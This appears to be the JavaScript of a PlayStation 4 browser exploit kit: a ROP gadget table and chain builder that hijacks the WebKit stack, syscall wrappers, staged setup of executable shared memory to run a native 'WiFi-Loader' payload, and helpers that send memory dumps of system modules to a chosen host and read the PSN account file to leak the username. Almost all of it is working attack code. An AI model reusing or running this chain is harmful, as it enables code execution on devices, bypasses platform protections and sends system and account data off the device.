	"add ah, byte [rax]": new gadget([], WEBKIT2, 0x9f98c8),
	"add edi, dword [rcx]": new gadget([], WEBKIT2, 0xa12cb2),
	
	"call rax": new gadget([], LIBKERNEL, 0x48),
	"call rbx": new gadget([], LIBKERNEL, 0x6143),
	"call rcx": new gadget([], LIBKERNEL, 0x1128d),
	"call rdx": new gadget([], LIBKERNEL, 0x100c3),
	"call rsi": new gadget([], LIBKERNEL, 0xe1c8),
	
	"jmp rax": new gadget([], LIBKERNEL, 0x94),
	"jmp rbx": new gadget([], LIBKERNEL, 0x26ac7),
	"jmp rcx": new gadget([], LIBKERNEL, 0xb9c6),
	"jmp rdx": new gadget([], LIBKERNEL, 0x666d),
	
	"ret": new gadget([], WEBKIT2, 0x52c04c),
}
var chain;

function gadget(instructions, module, address) {
	this.instructions = instructions;
	this.relativeAddress = address;
	this.checked = false;
	
	this.check = function() {
		if(!this.checked && this.instructions.length > 0) {
			var i;
			for(i = 0; i < this.instructions.length; i++) {
				if(getU8from(module_infos[module].image_base + address + i) != this.instructions[i]) {
					return false;
				}
			}
			
			// Check ends with ret
			if(getU8from(module_infos[module].image_base + address + this.instructions.length) != 0xc3) {
				return false;
			}
		}
		
		this.checked = true;
		return true;
	}
	
	this.address = function() {
		return module_infos[module].image_base + address;
	}
}

var checking = false;

function rop() {
	setBase(stack_base + return_va);
	var resp = getU64from(stack_base + return_va);
	this.data = stack_base + return_va + 0x420;
	var chainAddress = stack_base - 0x20000;
	var chainLength = 0;
	var variableAddresses = [];
	
	this.add = function() {
		var i;
		for(i = 0; i < arguments.length; i++) {
			if(typeof(arguments[i]) === "string") {
				if(checking && gadgets[arguments[i]].check() == false) throw(gadgets[arguments[i]].relativeAddress);
				setU64into(chainAddress + chainLength, gadgets[arguments[i]].address());
			}
			else {
				setU64into(chainAddress + chainLength, arguments[i]);
			}
			
			chainLength += 8;
		}
		
		return chainLength;
	}
	
	this.add("pop rbp", stack_base + return_va + 0x1400);
	
	this.add32 = function() {
		var i;
		for(i = 0; i < arguments.length; i++) {
			setU32into(chainAddress + chainLength, arguments[i]);
			
			chainLength += 4;
		}
		
		return chainLength;
	}
	
	this.syscall = function(name, systemCallNumber, arg1, arg2, arg3, arg4, arg5, arg6) {
		logAdd("syscall " + name);
		
		this.add("pop rax", systemCallNumber);
		if(typeof(arg1) !== "undefined") this.add("pop rdi", arg1);
		if(typeof(arg2) !== "undefined") this.add("pop rsi", arg2);
		if(typeof(arg3) !== "undefined") this.add("pop rdx", arg3);
		if(typeof(arg4) !== "undefined") this.add("pop rcx", arg4);
		if(typeof(arg5) !== "undefined") this.add("pop r8", arg5);
		if(typeof(arg6) !== "undefined") this.add("pop r9", arg6);
		this.add("mov r10, rcx; syscall");
	}
	
	this.call = function(name, module, address, arg1, arg2, arg3, arg4, arg5, arg6) {
		logAdd("call " + name);
		
		if(typeof(arg1) !== "undefined") this.add("pop rdi", arg1);
		if(typeof(arg2) !== "undefined") this.add("pop rsi", arg2);
		if(typeof(arg3) !== "undefined") this.add("pop rdx", arg3);
		if(typeof(arg4) !== "undefined") this.add("pop rcx", arg4);
		if(typeof(arg5) !== "undefined") this.add("pop r8", arg5);
		if(typeof(arg6) !== "undefined") this.add("pop r9", arg6);
		this.add(module_infos[module].image_base + address);
	}
	
	this.start = function(address) {
		logAdd("Starting code");
		
		setBase(0x926300000);
		u32[0x3FFFE] = gadgets["mov r10, rcx; syscall"].address() % 0x100000000;
		u32[0x3FFFF] = gadgets["mov r10, rcx; syscall"].address() / 0x100000000;
		
		this.add("pop rbp", stack_base + return_va - (chainLength + 8) + 0x1480);
		//this.add("pop rcx", "mov r10, rcx; syscall");
		this.add(address);
	}
	
	// Modifies rsi
	this.write_rax = function(address) {
		var valueAddress = this.add("pop rsi", address - 0x18) - 8;
		this.add("mov [rsi+0x18], rax");
		
		return valueAddress;
	}
	
	// Modifies rax
	this.write_rdi = function(address) {
		var valueAddress = this.add("pop rax", address - 0x60) - 8;
		this.add("mov [rax+0x60], rdi");
		
		return valueAddress;
	}
	
	// Modifies rax
	this.write_rdx = function(address) {
		var valueAddress = this.add("pop rax", address - 0x1e8) - 8;
		this.add("mov [rax+0x1e8], rdx");
		
		return valueAddress;
	}
	
	this.read_rax = function(address) {
		var valueAddress = this.add("pop rax", address - 0x830) - 8;
		this.add("mov rax, [rax+0x830]");
		
		return valueAddress;
	}
	
	this.read_rdi = function(address) {
		var valueAddress = this.add("pop rdi", address - 0x48) - 8;
		this.add("mov rdi, [rdi+0x48]");
		
		return valueAddress;
	}
	
	this.execute = function(afterExecution) {
		// Restore Stack Pointer
		this.add("pop rax", resp);
		this.write_rax(stack_base + return_va);
		this.add("pop rsp", stack_base + return_va);
		
		this.resolveVariables();
		
		// Redirect Stack Pointer to our ROP chain
		setU64into(stack_base + return_va, gadgets["pop rsp"].address());
		setU64into(stack_base + return_va + 8, chainAddress);
		
		setTimeout(function() {
			if(afterExecution) afterExecution();
		}, 1);
	}
	
	// Don't yet know where to store variables (depends on chainLength)
	// wait until entire ROP chain written, and evaluate the address in this.resolveVariables()
	this.write_rax_ToVariable = function(n) { variableAddresses.push({ number: n, address: this.write_rax(0), offset: -0x18 }); }
	this.write_rdi_ToVariable = function(n) { variableAddresses.push({ number: n, address: this.write_rdi(0), offset: -0x60 }); }
	this.write_rdx_ToVariable = function(n) { variableAddresses.push({ number: n, address: this.write_rdx(0), offset: -0x1e8 }); }
	this.read_rax_FromVariable = function(n) { variableAddresses.push({ number: n, address: this.read_rax(0), offset: -0x830 }); }
	this.read_rdi_FromVariable = function(n) { variableAddresses.push({ number: n, address: this.read_rdi(0), offset: -0x48 }); }
	
	this.resolveVariables = function() {
		var i;
		for(i = 0; i < variableAddresses.length; i++) {
			setU64into(chainAddress + variableAddresses[i].address, chainAddress + chainLength + variableAddresses[i].offset + variableAddresses[i].number * 8);
		}
	}
	
	this.getVariable = function(n) {
		return getU64from(chainAddress + chainLength + n * 8);
	}
	
	this.logVariable = function(n) {
		var v = getU64from(chainAddress + chainLength + n * 8);
		var s = "Variable " + n.toString() + " = 0x" + v.toString(16);
		if(errno[v]) s += " (" + errno[v] + ")";
		logAdd(s);
	}
}
var SCE_NET_AF_INET = 2;
var SCE_NET_SOCK_STREAM = 1;
var SCE_NET_SOCK_DGRAM = 2;
var SIZEOF_SIN = 16;

function createAddressStruct(ip, port) {
	var hexAddr;
	
	if(ip) {
		var addr = ip.split(".");
		var decmAddr = parseInt(addr[0]) * 256 * 256 * 256 + parseInt(addr[1]) * 256 * 256 + parseInt(addr[2]) * 256 + parseInt(addr[3]);
		hexAddr = parseInt(decmAddr).toString(16).toUpperCase();
	}
	else {
		hexAddr = "00000000";
	}
	
	var struct_addr = "";
	
	hostAddrHex = escapeToHex(hexAddr);
	hostPortHex = escapeToHex(baseToBase(10, 16, port));
	
	struct_addr = "\x00\x02"; //sin_family;
	struct_addr += hostPortHex; //sin_port;
	struct_addr += hostAddrHex; //sin_addr;
	struct_addr += "\x00\x00\x00\x00\x00\x00\x00\x00"; //sin_zero[8];
	
	return struct_addr;
}

function sendBuffer(hostAddr, hostPort, address, length) {
	var socket_name = "test";
	var socket_name_loc = chain.data;
	
	var struct_addr = createAddressStruct(hostAddr, hostPort);
	var struct_addr_loc = socket_name_loc + socket_name.length;
	
	writeString(socket_name_loc, socket_name);
	writeString(struct_addr_loc, struct_addr);
	
	chain.call("socket", SCENET, 0x2ff0, socket_name_loc, SCE_NET_AF_INET, SCE_NET_SOCK_STREAM, 0);
	chain.write_rax_ToVariable(0);
	
	chain.read_rdi_FromVariable(0);
	chain.call("connect", SCENET, 0x3030, undefined, struct_addr_loc, SIZEOF_SIN);
	
	chain.read_rdi_FromVariable(0);
	chain.call("send", SCENET, 0x3060, undefined, address, length, 0);
	
	chain.read_rdi_FromVariable(0);
	chain.call("close", SCENET, 0x3100, undefined);
}

function sendMessage(hostAddr, hostPort, message, length) {
	var socket_name = "test";
	var socket_name_loc = chain.data;
	
	var struct_addr = createAddressStruct(hostAddr, hostPort);
	var struct_addr_loc = socket_name_loc + socket_name.length;
	
	var message_loc = struct_addr_loc + struct_addr.length;
	
	writeString(socket_name_loc, socket_name);
	writeString(struct_addr_loc, struct_addr);
	writeString(message_loc, message);
	
	chain.call("socket", SCENET, 0x2ff0, socket_name_loc, SCE_NET_AF_INET, SCE_NET_SOCK_STREAM, 0);
	chain.write_rax_ToVariable(0);
	
	chain.read_rdi_FromVariable(0);
	chain.call("connect", SCENET, 0x3030, undefined, struct_addr_loc, SIZEOF_SIN);
	
	chain.read_rdi_FromVariable(0);
	chain.call("send", SCENET, 0x3060, undefined, message_loc, length, 0);
	
	chain.read_rdi_FromVariable(0);
	chain.call("close", SCENET, 0x3100, undefined);
}

/*function receiveBuffer(hostPort, buffer, length) {
	var socket_name = "test";
	var socket_name_loc = chain.data;
	
	var struct_addr = createAddressStruct(undefined, hostPort);
	var struct_addr_loc = socket_name_loc + socket_name.length;
	
	writeString(socket_name_loc, socket_name);
	writeString(struct_addr_loc, struct_addr);
	
	chain.call("socket", SCENET, 0x2ff0, socket_name_loc, SCE_NET_AF_INET, SCE_NET_SOCK_STREAM, 0);
	chain.call("bind", SCENET, 0x3000, 0x54, struct_addr_loc, SIZEOF_SIN);
	chain.call("listen", SCENET, 0x3010, 0x54, 10);
	chain.call("accept", SCENET, 0x3020, 0x54, 0, 0);
	chain.call("recv", SCENET, 0x3090, 0x55, buffer, length, 0);
}*/

function receiveBufferS1(hostPort, buffer, length) {
	var socket_name = "test";
	var socket_name_loc = chain.data;
	
	var struct_addr = createAddressStruct(undefined, hostPort);
	var struct_addr_loc = socket_name_loc + socket_name.length;
	
	writeString(socket_name_loc, socket_name);
	writeString(struct_addr_loc, struct_addr);
	
	chain.call("socket", SCENET, 0x2ff0, socket_name_loc, SCE_NET_AF_INET, SCE_NET_SOCK_STREAM, 0);
	chain.write_rax_ToVariable(0);
	
	chain.read_rdi_FromVariable(0);
	chain.call("bind", SCENET, 0x3000, undefined, struct_addr_loc, SIZEOF_SIN);
	
	chain.read_rdi_FromVariable(0);
	chain.call("listen", SCENET, 0x3010, undefined, 10);
	
	chain.read_rdi_FromVariable(0);
	chain.call("accept", SCENET, 0x3020, undefined, 0, 0);
}

function receiveBufferS2(hostPort, buffer, length) {
	chain.call("socket", SCENET, 0x2ff0, socket_name_loc, SCE_NET_AF_INET, SCE_NET_SOCK_STREAM, 0);
	chain.call("bind", SCENET, 0x3000, 0x54, struct_addr_loc, SIZEOF_SIN);
	chain.call("listen", SCENET, 0x3010, 0x54, 10);
	chain.call("accept", SCENET, 0x3020, 0x54, 0, 0);
	chain.call("recv", SCENET, 0x3090, 0x55, buffer, length, 0);
}
// global vars  
var _log0, _log, _dview;

// prints log messages
console.log = function(txt) {
	if (!_log0){
		_log0 = document.getElementById("log");
		if (!_log0) return;
	}
	if (!_log){
		_log = document.createElement("div");
		if (_log0.hasChildNodes()){
			_log0.insertBefore(_log, _log0.firstChild);
		}else{
			_log0.appendChild(_log);
		}
	}
	var div = document.createElement("div");
	div.innerHTML = txt;	
	_log.appendChild(div);
}

var logAdd = console.log;
console.error = console.log;

function getEnvironmentInfo() {
	var s = new Date().toTimeString() + "<br>";
	s += navigator.userAgent + "<br/>";
	s += navigator.appName + " (" + navigator.platform + ")<br><br>";
	return s;
}

function getQuery() {
	var queryDict = {};
	location.search.substr(1).split("&").forEach(function(item) {queryDict[item.split("=")[0]] = item.split("=")[1]});
	return queryDict;
}

function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    
    for(var i = 0; i < ca.length; i++) {
        var c = ca[i];
        while(c.charAt(0) == ' ') c = c.substring(1);
        if (c.indexOf(name) == 0) return c.substring(name.length, c.length);
    }
    
    return "";
}

// returns WebKit major version number
function getWebKitVersion(tmpl)
{
	var str = navigator.userAgent;
	if (!tmpl) tmpl = "WebKit/";
	var i = str.indexOf(tmpl);
	if (i >= 0) {
		i += tmpl.length;
		i = +str.substring(i,i+3);
		return isNaN(i) ? 0 : i;
	}
	return 0;
}

// creates new Uint32Array from Uint8Array's data
function U8toU32(u8)
{
	var len = u8.length;
	var u32 = new Uint32Array((len >>> 2) + (len % 4 ? 1:0));
	if (len > 1) {
		len--;
		for(var i=0; i <= len; i++){		
			u32[i >>> 2] += u8[i] << ((i%4)*8);		
		}
	}else{
		if (len) u32[0]	= u8[0];
	}
	return u32;
}	

// writes one array into another, and saves the old content
function exchangeArrays(aFrom, aTo, offs)
{
	var u, len = aFrom.length;
	for(var i=0; i < len; i++, offs++){
		u = aTo[offs];
		aTo[offs] = aFrom[i];
		aFrom[i] = u;
	}
}

// outputs uint32 as a comma-separated list of bytes
function getU8str(u)
{
	var str = "", s;
	for(var i=0; i < 4; i++, u >>>= 8) {
		s = (u & 0xff).toString(16);
		if (s.length < 2) s = "0" + s;
		str += s + (i < 3 ? ",":"");
	}
	
	return str;
}

// outputs the content of array object
function ArrayToU8String(arr, offs, len)
{
	var str = "["; 
	len += offs-1;	
	for(var i=offs; i <= len; i++){
	  	str += getU8str(arr[i]);
	  	str += i < len ? ", &nbsp;" + (i % 4 == 3 ? "<br/>":"") : "]";
	}
	return str;
}


// outputs the content of array object
function ArrayToString(arr, offs, len)
{
	var str = "["; 
	len += offs-1;	
	for(var i=offs; i <= len; i++){
	  	str += (arr[i] > 9 && arr[i] <= 0xffffffff) ? "0x" + arr[i].toString(16) : arr[i];
	  	str += (i < len) ? ", " : "]";
	}
	return str;
}

function ArrayToString2(arr, offs, len)
{
	var str = ""; 
	len += offs-1;	
	for(var i=offs; i <= len; i++){
	  	str += (arr[i] > 9 && arr[i] <= 0xffffffff) ? "" + arr[i].toString(16) : arr[i];
	  	str += (i < len) ? "," : "";
	}
	return str;
}

// wraps two uint32s into double precision
function u2d(low,hi)
{
	if (!_dview) _dview = new DataView(new ArrayBuffer(16));
	_dview.setUint32(0,hi);
	_dview.setUint32(4,low);
	return _dview.getFloat64(0);	
}

// unwraps uints from double 
function d2u(d)
{
	if (!_dview) _dview = new DataView(new ArrayBuffer(16));
	_dview.setFloat64(0,d);
	return { low: _dview.getUint32(4), 
	         hi:  _dview.getUint32(0) };    
}
function load() {
	document.getElementById("environment").innerHTML = getEnvironmentInfo();
	exploit();
	chain = new rop();
	
	var codeExecutionStage = getCookie("codeExecutionStage");
	if(codeExecutionStage == "1") {
		cleanSessionVars();
		allocateSharedMemory();
		document.getElementById("codeExecutionStage").innerHTML = "Stage: Mapping shared memory...";
		setTimeout(function() { document.cookie = "codeExecutionStage=1.1"; location.reload(); }, 10);
	}
	else if(codeExecutionStage == "1.1") {
		allocateSharedMemory2();
		document.getElementById("codeExecutionStage").innerHTML = "Stage: Mapping shared memory 2...";
		setTimeout(function() { document.cookie = "codeExecutionStage=2"; location.reload(); }, 10);
	}
	else if(codeExecutionStage == "2") {
		mapSharedMemory();
		document.getElementById("codeExecutionStage").innerHTML = "Stage: Waiting for payload...";
		setTimeout(function() { document.cookie = "codeExecutionStage=3"; location.reload(); }, 10);
	}
	else if(codeExecutionStage == "3") {
		payload();
		document.getElementById("codeExecutionStage").innerHTML = "Stage: Executing...";
		setTimeout(function() { document.cookie = "codeExecutionStage=4"; location.reload(); }, 10);
	}
	else if(codeExecutionStage == "4") {
		copy();
		document.getElementById("codeExecutionStage").innerHTML = "Stage: Done!";
		setTimeout(function() { document.cookie = "codeExecutionStage=0"; location.reload(); }, 10);
	}
}

var SECTIONSIZE = 1024 * 1024;

function cleanSessionVars() {
	sessionStorage.executableHandle = null;
	sessionStorage.writableHandle = null;
}

function allocateSharedMemory() {
	chain.call("createSharedMemory", LIBKERNEL, 0x15170, 0, SECTIONSIZE, 1 | 2 | 4, chain.data);
	chain.execute(function() {
		var executableHandle = getU64from(chain.data);
		logAdd("0x" + executableHandle.toString(16)); // 0x52

		sessionStorage.executableHandle = JSON.stringify(executableHandle);
		
		logAdd("<h1>Refresh page and run Stage 1.1</h1>");
	});
}

function allocateSharedMemory2() {
	var executableHandle = JSON.parse(sessionStorage.executableHandle || "{}");

	chain.call("createSharedMemoryAlias", LIBKERNEL, 0x151c0, executableHandle, 1 | 2, chain.data);
	chain.syscall("mmap", 477, 0x926300000, SECTIONSIZE * 2, 1 | 2, 4096, -1, 0);
	chain.write_rax_ToVariable(0);
	
	chain.execute(function() {
		var dataAddress = chain.getVariable(0);
		var writableHandle = getU64from(chain.data);

		logAdd("0x" + executableHandle.toString(16)); // 0x52		
		logAdd("0x" + writableHandle.toString(16)); // 0x53
		logAdd("Data address: 0x" + dataAddress.toString(16)); // 0x926300000

		sessionStorage.writableHandle = JSON.stringify(writableHandle);
		
		logAdd("<h1>Refresh page and run Stage 2</h1>");
	});
}

function mapSharedMemory() {
	var executableHandle = JSON.parse(sessionStorage.executableHandle || "{}");
	var writableHandle = JSON.parse(sessionStorage.writableHandle || "{}");

	chain.call("mapSharedMemory", LIBKERNEL, 0x15210, writableHandle, 1 | 2, chain.data);
	chain.syscall("mmap", 477, 0x926100000 + SECTIONSIZE, SECTIONSIZE, 1 | 4, 1, executableHandle, 0);
	chain.write_rax_ToVariable(0);
	
	chain.execute(function() {
		var writeAddress = getU64from(chain.data); // 0x926100000
		var executeAddress = chain.getVariable(0); // 0x926200000 (0x926100000 + SECTIONSIZE)
		
		logAdd("Write address: 0x" + writeAddress.toString(16));
		logAdd("Execute address: 0x" + executeAddress.toString(16));
		
		logAdd("<h1>Refresh page and run Stage 3</h1>");
	});
}

function payload() {
	var writeAddress = 0x926100000;
	var executeAddress = 0x926200000;
	
	// infinite loop
	//setU32to(writeAddress, 0xfeeb);
	
	// return
	//setU32to(writeAddress, 0xc3);
	
	// mini loop
	//setU32to(writeAddress + 0 * 4, 0x48c03148);
	//setU32to(writeAddress + 1 * 4, 0x4801e883);
	//setU32to(writeAddress + 2 * 4, 0xf775c085);
	//setU32to(writeAddress + 3 * 4, 0x000000c3);
	
	// WiFi-Loader
	writeLoader(writeAddress);
	
	chain.start(executeAddress);
	chain.write_rax_ToVariable(0);
	
	chain.execute(function() {
		chain.logVariable(0);
		
		logAdd("<h1>Refresh page and run Stage 4</h1>");
	});
}

function copy() {
	var writeAddress = 0x926100000;
	var executeAddress = 0x926200000;
	var dataAddress = 0x926300000;
	
	// Copy code
	var c = [];
	
	setBase(dataAddress);
	for(i = 0; i < SECTIONSIZE / 4; i++) c[i] = u32[i];
	
	setBase(writeAddress);
	for(i = 0; i < SECTIONSIZE / 4; i++) u32[i] = c[i];
	
	// Copy data
	var d = [];
	
	setBase(dataAddress + SECTIONSIZE);
	for(i = 0; i < SECTIONSIZE / 4; i++) d[i] = u32[i];
	
	setBase(dataAddress);
	for(i = 0; i < SECTIONSIZE / 4; i++) u32[i] = d[i];
	
	// Kill all elements in body
	var body = document.getElementsByTagName("body")[0];
	
	//while(body.firstChild) {
	//	body.removeChild(body.firstChild);
	//}
	
	// Hide cursor
	document.body.style.cursor = "none";
	
	// Create canvas
	var canvas = document.createElement("canvas");
	
	canvas.id = "canvas";
	canvas.width = 160;
	canvas.height = 144;
	canvas.style.zIndex = 1;
	canvas.style.position = "absolute";
	canvas.style.border = "1px solid";
	
	// Centered
	//canvas.style.left = ((window.screen.width - canvas.width) / 2).toString() + "px";
	//canvas.style.top = ((window.screen.height - canvas.height) / 2).toString() + "px";
	
	// Fullscreen
	canvas.style.left = "0px";
	canvas.style.top = "0px";
	canvas.style.width = "100%";
	canvas.style.height = "100%";
	
	//body.appendChild(canvas);
	
	// Create a framebuffer, and put some data in so we can find it
	window.context = canvas.getContext("2d");
	
	context.fillStyle = "#c2c2c2";
	context.fillRect(0, 0, canvas.width, canvas.height);
	
	window.framebuffer = context.getImageData(0, 0, canvas.width, canvas.height);
	
	setInterval(function() {
		context.putImageData(framebuffer, 0, 0);
	}, 1000 / 60); // try for 60 FPS
	
	// Execute
	chain.start(executeAddress);
	chain.write_rax_ToVariable(0);
	
	chain.execute(function() {
		chain.logVariable(0);
		
		setBase(dataAddress);
		logAdd(hexDump(dataAddress, 256));
	});
}

function getpid() {
	chain.syscall("getpid", 20);
	chain.write_rax_ToVariable(0);
	
	chain.execute(function() {
		chain.logVariable(0);
	});
}

function getlogin() {
	chain.syscall("getlogin", 49, chain.data, 17);
	
	chain.execute(function() {
		var name = readString(chain.data);
		var pointer = getU32from(chain.data + 8);
		
		logAdd("Name: " + name);
		logAdd("Leaked pointer: 0x" + pointer.toString(16));
	});
}

function setLDT() {
	setU32to(chain.data + 0, 0xffffffff);
	setU64to(chain.data + 4, chain.data + 64);
	setU32to(chain.data + 12, 1);
	
	setU8to(chain.data + 64 + 0, 0xff);
	setU8to(chain.data + 64 + 1, 0xff);
	setU8to(chain.data + 64 + 2, 0x00);
	setU8to(chain.data + 64 + 3, 0x00);
	setU8to(chain.data + 64 + 4, 0x00);
	setU8to(chain.data + 64 + 5, 0x73);
	setU8to(chain.data + 64 + 6, 0xcf);
	setU8to(chain.data + 64 + 7, 0x00);
	setU8to(chain.data + 64 + 8, 0x00);
	setU8to(chain.data + 64 + 9, 0x00);
	setU8to(chain.data + 64 + 10, 0x00);
	setU8to(chain.data + 64 + 11, 0x00);
	setU8to(chain.data + 64 + 12, 0x00);
	setU8to(chain.data + 64 + 13, 0x00);
	setU8to(chain.data + 64 + 14, 0x00);
	setU8to(chain.data + 64 + 15, 0x00);
	
	chain.syscall("sysarch", 165, 1, chain.data);
	chain.write_rax_ToVariable(0);
	
	chain.execute(function() {
		chain.logVariable(0);
	});
}

function getThread() {
	chain.call("getThread", LIBKERNEL, 0x128F0);
	chain.write_rax_ToVariable(0);
	
	chain.execute(function() {
		chain.logVariable(0);
	});
}

function getLoadedModules() {
	var countAddress = chain.data;
	var modulesAddress = chain.data + 8;
	
	chain.syscall("getLoadedModules", 592, modulesAddress, 256, countAddress);
	chain.write_rax_ToVariable(0);
	
	chain.execute(function() {
		chain.logVariable(0);
		
		var count = getU64from(countAddress);
		
		logAdd("Loaded modules:");
		logAdd("Index - ID");
		
		for(var index = 0; index < count; index++) {
			var m = getU32from(modulesAddress + index * 4);
			
			logAdd(index.toString() + " - " + "0x" + m.toString(16) + " (" + m.toString() + ")");
		}
	});
}

function readModule() {
	var moduleNumberV = document.getElementById("loadedModuleID").value;
	
	if(!moduleNumberV) {
		logAdd("Enter a module number");
		document.getElementById("moduleNumber").focus();
		return;
	}
	
	var moduleNumber = parseInt(moduleNumberV);
	
	var moduleInfoAddress = chain.data;
	setU64to(moduleInfoAddress, 0x160);
	
	chain.syscall("getModuleInfo", 0, 593, moduleNumber, moduleInfoAddress);
	
	chain.execute(function() {
		var moduleName = readString(moduleInfoAddress + 0x8);
		var codeBase = getU64from(moduleInfoAddress + 0x108);
		var codeSize = getU32from(moduleInfoAddress + 0x110);
		var dataBase = getU64from(moduleInfoAddress + 0x118);
		var dataSize = getU32from(moduleInfoAddress + 0x120);
		var moduleBase = codeBase;
		var moduleSize = codeSize + dataSize;
		
		logAdd("Name: " + moduleName);
		logAdd("Base: 0x" + moduleBase.toString(16));
		logAdd("Size: " + (moduleSize / 1024).toString() + "KB");
	});
}

function dumpModule() {
	var hostAddr = document.getElementById("hostAddr").value;
	var hostPort = document.getElementById("hostPort").value;
	var socketMessage = document.getElementById("socketMessage").value;
	
	var moduleNumberV = document.getElementById("loadedModuleIndex").value;
	
	if(!moduleNumberV) {
		logAdd("Enter a module number");
		document.getElementById("moduleNumber").focus();
		return;
	}
	
	if(!hostAddr) {
		logAdd("Enter an IP address");
		document.getElementById("hostIP").focus();
		return;
	}
	
	if(!hostPort) {
		logAdd("Enter a port number");
		document.getElementById("hostPort").focus();
		return;
	}
	
	if(!socketMessage) {
		logAdd("Enter a message");
		document.getElementById("socketMessage").focus();
		return;
	}
	
	var moduleNumber = parseInt(moduleNumberV);
	
	sendBuffer(hostAddr, hostPort, module_infos[moduleNumber].image_base, module_infos[moduleNumber].image_size);
	
	chain.execute(function() {
		logAdd("Dump sent to " + hostAddr + ":" + hostPort);
	});
}

function loadModule() {
	var moduleNumberV = document.getElementById("moduleID").value;
	
	if(!moduleNumberV) {
		logAdd("Enter a module number");
		document.getElementById("moduleNumber").focus();
		return;
	}
	
	var moduleNumber = parseInt(moduleNumberV);
	
	var moduleInfoAddress = chain.data;
	setU64to(moduleInfoAddress, 0x160);
	
	chain.call("loadModule", LIBSYSMODULE, 0x1850, moduleNumber, 0, 0, 0);
	chain.syscall("getModuleInfo", 0, 593, 0x65, moduleInfoAddress);
	
	chain.execute(function() {
		var moduleName = readString(moduleInfoAddress + 0x8);
		var codeBase = getU64from(moduleInfoAddress + 0x108);
		var codeSize = getU32from(moduleInfoAddress + 0x110);
		var dataBase = getU64from(moduleInfoAddress + 0x118);
		var dataSize = getU32from(moduleInfoAddress + 0x120);
		var moduleBase = codeBase;
		var moduleSize = codeSize + dataSize;
		
		logAdd("Loaded " + moduleName);
		logAdd("Size: " + moduleSize / 1024 + "KB");
		logAdd("This module will only be loaded during this process, please now refresh to avoid a crash (then you can dump it). Upon restart you must reload any extra module.");
		logAdd("You can only load a single extra module, if you wish to load a different module restart the browser process.");
	});
}

function loadNamedModule() {
	var moduleName = document.getElementById("moduleName").value;
	
	if(!moduleName) {
		logAdd("Enter a module name");
		document.getElementById("moduleName").focus();
		return;
	}
	
	writeString(chain.data, moduleName);
	chain.syscall("loadModule", 594, chain.data, 0, chain.data + 0x20, 0);
	chain.write_rax_ToVariable(0);
	
	chain.execute(function() {
		chain.logVariable(0);
		logAdd("Loaded with ID: " + getU32from(chain.data + 0x20));
		logAdd("Refresh the page and use Read Loaded Module");
	});
}

function getPSN() {
	var path = chain.data;
	var contents = chain.data;
	
	writeString(path, "/user/home/10000000/np/account.dat");
	chain.syscall("open", 5, path, 0, 0);
	chain.write_rax_ToVariable(0);
	
	chain.read_rdi_FromVariable(0);
	chain.syscall("read", 3, undefined, contents, 1028);
	
	chain.execute(function() {
		setU8to(contents + 0x50, 0x20);
		var name = readString(contents + 0x50).slice(1);
		
		logAdd("PSN username: " + name);
	});
}

function getSandboxDirectory() {
	setU64to(chain.data, 10);
	chain.syscall("getSandboxDirectory", 602, 0, chain.data + 8, chain.data);
	chain.write_rax_ToVariable(0);
	
	chain.execute(function() {
		var name = readString(chain.data + 8);
		logAdd(name);
	});
}

function getStackProtection() {
	var info = chain.data;
	
	chain.syscall("getMemoryInfo", 547, stack_base, info);
	
	chain.execute(function() {
		var base = getU64from(info + 0x0);
		var size = getU64from(info + 0x8) - base;
		var protection = getU32from(info + 0x10);
		
		logAdd("Stack base: 0x" + base.toString(16));
		logAdd("Stack size: 0x" + size.toString(16));
		logAdd("Stack protection: 0x" + protection.toString(16));
	});
}

function getStackName() {
	var info = chain.data;
	
	//chain.syscall("getOtherMemoryInfo", 572, stack_base, 0, info, 0x40);
	chain.syscall("getOtherMemoryInfo", 572, 0, 1, info, 0x40);
	
	chain.execute(function() {
		var base = getU64from(info + 0x0);
		var size = getU64from(info + 0x8) - base;
		var name = readString(info + 0x20);
		
		//setU16to(base + 0x4000, 0xfeeb);
		setBase(base);
		logAdd(hexDump(base, 16));
		
		setBase(base + 0x4000);
		logAdd(hexDump(base + 0x4000, 16));
		
		logAdd("Stack base: 0x" + base.toString(16));
		logAdd("Stack size: 0x" + size.toString(16));
		logAdd("Stack name: " + name);
	});
}

function socketSend() {
	var hostAddr = document.getElementById("hostAddr").value;
	var hostPort = document.getElementById("hostPort").value;
	var socketMessage = document.getElementById("socketMessage").value;
	
	if(!hostAddr) {
		logAdd("Enter an IP address");
		document.getElementById("hostIP").focus();
		return;
	}
	
	if(!hostPort) {
		logAdd("Enter a port number");
		document.getElementById("hostPort").focus();
		return;
	}
	
	if(!socketMessage) {
		logAdd("Enter a message");
		document.getElementById("socketMessage").focus();
		return;
	}
	
	sendMessage(hostAddr, hostPort, socketMessage, socketMessage.length);
	
	chain.execute(function() {
		logAdd("\"" + socketMessage + "\" sent to " + hostAddr + ":" + hostPort);
	});
}